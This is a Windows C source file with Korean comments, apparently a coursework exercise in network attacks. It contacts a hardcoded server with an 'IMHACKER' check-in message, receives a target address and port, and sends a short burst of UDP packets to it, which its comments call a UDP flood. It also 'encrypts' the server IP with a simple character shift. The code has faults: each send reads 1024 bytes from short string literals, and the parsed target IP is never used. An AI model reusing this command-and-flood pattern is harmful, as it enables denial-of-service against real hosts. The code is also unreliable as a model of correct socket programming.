#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <WinSock2.h> //유닉스에서 사용하던 소켓을 윈도우에서 사용할 수 있도록 만든 winsock을 include 한다. 
#include <stdlib.h>
#include <string.h>
#include <ws2tcpip.h>

#pragma comment (lib, "ws2_32.lib")

#define BUFSIZE 1024
#define	PORT 10004
#define MAX_STR 13

int main() {
	// 윈속 구조체, 소켓 구조체, 소켓 주소 구조체를 할당한다.
	WSADATA winsockData; //WSADATA: 윈속 초기화 구조체
	SOCKET clientSocket; //SOCKET: 소켓 구조체
	SOCKADDR_IN serverAddr; // SOCKADDR: 소켓 주소 구조체
	// SOCKADDR clientAddr; //client에서는 clientaddr 까지 사용할 일이 없다. (udp 통신일 경우)

	// 송수신에 사용할 버퍼(buf), 송수신 데이터 길이 변수(recvLen,sendLen), 주소 구조체 길이(serversize)를 저장하기 위한 변수를 할당한다. 
	char buf[BUFSIZE];
	int recvLen;
	int sendLen;
	int serverSize;

	//IP주소 암호화, 복호화
	char encrypted_string[MAX_STR] = { 0 };
	char decrypted_string[MAX_STR] = { 0 };
	char input_string[] = "114.70.37.17";

	for (int i = 0; i < MAX_STR; i++)
	{
		char c = input_string[i];
		encrypted_string[i] = c;
		if (c == '\0') break;
		int ascii = (int)c;
		int ascii_en = ascii - 3;
		char c_en = (char)ascii_en;
		encrypted_string[i] = c_en;
	}
	printf("%s\n", encrypted_string);

	for (int i = 0; i < MAX_STR; i++)
	{
		char c = encrypted_string[i];
		if (c == '\0') break;
		int ascii = (int)c;
		int ascii_de = ascii + 3;
		char c_de = (char)ascii_de;
		decrypted_string[i] = c_de;
	}
	printf("%s\n", decrypted_string);
	
	//윈속 구조체를 초기화 시켜준다.
	if (WSAStartup(0x202, &winsockData) == SOCKET_ERROR) {
		printf("윈속 초기화 실패 \n");
		WSACleanup();
		return;
	}
	printf("윈속 초기화 성공 \n");

	// 주소 구조체(serverAddr)와 데이터 저장 변수(buf)를 초기화 시킨다. 
	memset(&serverAddr, 0, sizeof(serverAddr));
	memset(buf, 0, BUFSIZE);

	// 서버 주소 구조체 초기화
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_addr.s_addr = inet_addr("114.70.37.17");
	serverAddr.sin_port = htons(PORT); // 제일 위에서 포트 번호를 10004번으로 설정했다.

	// 소켓 생성 및 소켓 생성 실패 시 에러 처리
	clientSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (clientSocket == INVALID_SOCKET) {
		printf("소켓 생성 실패 \n");
		WSACleanup();
		return;
	}
	printf("소켓 생성 성공 \n");


	// sendto 함수를 이용해서 serverAddr에 메시지 전송하고 에러 발생하면 에러 처리
	sendLen = sendto(clientSocket, "IMHACKER_2019111394", BUFSIZE, 0, (struct sockaddr*)&serverAddr, sizeof(serverAddr));;

	if (sendLen != BUFSIZE) {
		printf("sendto() 에러 \n");
		return;
	}

	//recvfrom 을 하기 위해 주소 구조체 크기를 변수에 저장하고, 데이터 받기 위해 buf를 0으로 초기화
	serverSize = sizeof(serverAddr);
	memset(buf, 0, BUFSIZE);

	//서버로부터 응답 데이터를 recvfrom 함수를 통해 받고 에러 발생시 에러 처리.
	recvLen = recvfrom(clientSocket, buf, BUFSIZE, 0, (struct sockaddr*)&serverAddr, &serverSize);
	if (recvLen < 0) {
		printf("recvfrom() 에러 \n");
		return;
	}
	// 서버로부터 받은 데이터를 출력한다. 
	printf("받은 메세지: %s \n", buf);

	// server로 부터 받은 데이터에서 ip와 포트 번호를 알아낸다. 
	char* str1 = NULL;
	char* str2 = strtok_s(buf, "_", &str1); //_를 기준으로 문자열을 자른다.

	printf("잘린 문자열 : %s\n", str2); //출력
	printf("자르고 남은 문자열 : %s\n", str1);

	str2 = strtok_s(NULL, ":", &str1); //_를 기준으로 문자열을 자른다.

	printf("잘린 문자열 : %s\n", str2); // str2가 ip주소가 된다.
	printf("자르고 남은 문자열 : %s\n", str1); //str1이 port번호가 된다. 

	// 문자열을 int로 변환한다.
	int num;
	num = atoi(str1);


	//윈속 구조체를 초기화 시켜준다.
	if (WSAStartup(0x202, &winsockData) == SOCKET_ERROR) {
		printf("윈속 초기화 실패 \n");
		WSACleanup();
		return;
	}
	printf("윈속 초기화 성공 \n");

	// 데이터 저장 변수,ip주소,포트 번호 초기화 
	memset(buf, 0, BUFSIZE);
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(num);


	//10번 반복하여 데이터를 보낸다 (UDP flooding 수행)
	for (int i = 0; i < 10; i++)
	{
		// sendto 함수를 이용해서 serverAddr에 데이터(buf) 전송하고 에러 발생하면 에러 처리
		sendLen = sendto(clientSocket, "2019111394", BUFSIZE, 0, (struct sockaddr*)&serverAddr, sizeof(serverAddr));

		if (sendLen != BUFSIZE) {
			printf("sendto() 에러 \n");
			return;
		}
	}

	//소켓을 닫고 통신을 끝낸다. 
	closesocket(clientSocket);
	WSACleanup();


}